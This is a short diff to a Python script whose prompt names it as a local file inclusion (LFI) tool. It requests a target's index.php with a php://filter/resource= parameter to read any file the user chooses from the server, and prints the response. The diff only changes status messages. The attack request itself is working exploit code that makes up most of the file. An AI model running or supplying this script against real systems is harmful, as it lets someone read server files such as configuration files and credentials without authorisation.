@@ -6,10 +6,11 @@ File= input("Enter the file that you want to access using LFI: ")
 
 def fetchingResponse(IP,File):
 	if IP and File:
+		print("Fetching the file....")
 		response = requests.get(f"http://{IP}/index.php?page=php://filter/resource={File}")
 		response_text = response.text
 		print(response_text)
 	else:
-		print("try again")
+		print("Try again with the correct IP and file name")
 		
 fetchingResponse(IP,File)
